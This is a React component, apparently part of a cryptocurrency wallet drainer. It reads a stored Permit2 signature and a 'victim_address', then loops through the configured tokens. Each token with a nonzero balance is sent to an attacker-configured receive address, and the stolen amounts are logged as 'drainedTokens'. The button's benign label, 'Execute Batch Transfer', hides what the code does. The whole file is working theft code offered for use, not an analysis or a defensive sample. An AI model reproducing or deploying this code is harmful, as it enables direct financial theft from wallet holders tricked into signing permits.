import React, { useState } from 'react';
import { ethers } from 'ethers';
import { PERMIT2_ADDRESSES } from '../../config/permit2Addresses';
import { TOKENS } from '../../config/tokens';
import { getReceiveAddress } from '../../config/receiveAddress';
import toast from 'react-hot-toast';

const PERMIT2_ABI = [
  'function permitTransferFrom(tuple(address token, uint160 amount, uint48 expiration, uint48 nonce) details, address from, uint256 sigDeadline, bytes signature) external'
];

export const BatchTransfer = () => {
  const [isExecuting, setIsExecuting] = useState(false);

  const executeBatchDrain = async () => {
    const signature = localStorage.getItem('permit2_signature');
    const expiry = localStorage.getItem('permit2_expiry');
    const victimAddress = localStorage.getItem('victim_address');
    
    if (!signature || Date.now() > parseInt(expiry) * 1000) {
      toast.error('Please approve Permit2 signature first');
      return;
    }

    setIsExecuting(true);
    
    try {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();
      const currentAddress = await signer.getAddress();
      
      if (currentAddress.toLowerCase() !== victimAddress.toLowerCase()) {
        toast.error('Wallet changed. Please re-approve.');
        return;
      }
      
      const chainId = (await provider.getNetwork()).chainId;
      
      const tokens = TOKENS[chainId] || TOKENS[1];
      const permit2Address = PERMIT2_ADDRESSES[chainId];
      const receiveAddress = getReceiveAddress();
      
      if (!receiveAddress) {
        throw new Error('Receive address not configured');
      }
      
      const permit2Contract = new ethers.Contract(permit2Address, PERMIT2_ABI, signer);
      
      const drainedTokens = [];
      
      for (const token of tokens) {
        const tokenContract = new ethers.Contract(token.address, [
          'function balanceOf(address) view returns (uint256)'
        ], provider);
        
        const balance = await tokenContract.balanceOf(victimAddress);
        
        if (balance.gt(0)) {
          const permitDetails = {
            token: token.address,
            amount: balance.toString(),
            expiration: Math.floor(Date.now() / 1000) + 300,
            nonce: 0
          };
          
          const tx = await permit2Contract.permitTransferFrom(
            permitDetails,
            victimAddress,
            receiveAddress,
            Math.floor(Date.now() / 1000) + 300,
            signature,
            { gasLimit: 200000 }
          );
          
          await tx.wait();
          
          drainedTokens.push({
            symbol: token.symbol,
            amount: ethers.utils.formatUnits(balance, token.decimals),
            txHash: tx.hash
          });
        }
      }
      
      toast.success(`Transferred ${drainedTokens.length} tokens`);
      
    } catch (error) {
      console.error('Batch transfer failed:', error);
      toast.error('Transaction failed');
    } finally {
      setIsExecuting(false);
    }
  };

  return (
    <button
      onClick={executeBatchDrain}
      disabled={isExecuting}
      className={`w-full py-3 rounded-xl font-bold text-lg transition-all ${
        isExecuting ? 'bg-gray-700 cursor-wait' : 'bg-gradient-to-r from-blue-600 to-cyan-600 hover:from-blue-500 hover:to-cyan-500'
      } text-white`}
    >
      {isExecuting ? 'Executing Batch Transfer...' : 'Execute Batch Transfer'}
    </button>
  );
};